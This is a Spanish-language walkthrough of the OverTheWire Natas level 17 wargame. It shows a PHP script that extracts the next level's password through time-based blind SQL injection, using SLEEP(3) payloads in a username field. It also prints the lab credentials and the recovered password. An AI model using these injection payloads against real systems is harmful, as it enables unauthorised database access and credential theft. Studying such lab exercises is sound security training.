Este nivel es similar al nivel 15, con la salvedad de que ahora no se imprime
por pantalla el resultado de la consulta (ni siquiera si dio o no resultado).

```php
...
$res = mysqli_query($link, $query);
if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
} else {
    echo "Error in query.<br>";
}
...
```

Para resolver el ejercicio, podemos utilizar la misma técnica, pero cambiando el
criterio de validación. Debido a que no vemos el resultado, podemos agregar en
caso de que encuentre resultado, un `sleep`. Luego en base al tiempo de
respuesta determinaremos el resultado de la misma.

```php
$authorization = base64_encode("natas17:XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd");
$url = "http://natas17.natas.labs.overthewire.org/index.php?debug";
$valid_time = 3;

function verify($inyection)
{
    global $authorization;
    global $url;
    global $valid_time;

    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n" .
                "Authorization: Basic $authorization\r\n",
            'method' => 'POST',
            'content' => http_build_query(['username' => $inyection]),
        ],
    ];

    $context = stream_context_create($options);

    $time_pre = microtime(true);
    file_get_contents($url, false, $context);
    $time_post = microtime(true);

    return ($time_post - $time_pre) > $valid_time;
}

function contains_inyection($substring)
{
    return "natas18\" AND password LIKE BINARY \"%$substring%\" AND SLEEP(3) != \"";
}

function startwith_inyection($start)
{
    return "natas18\" AND password LIKE BINARY \"$start%\" AND SLEEP(3) != \"";
}


function equals_inyection($password)
{
    return "natas18\" AND password LIKE BINARY \"$password\" AND SLEEP(3) != \"";
}
```

El resto del código es similar al de los niveles anteriores.Al ejecutarlo,
obtendremos la contraseña para el usuario natas18 luego de un rato.

```
$ php crack-natas17.php
...
...
Final password: 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq
```

Debido a que depende del tiempo, es mejor si se ejecuta multiples veces de forma
simultánea. Esto permite encontrar errores y corregirlos.

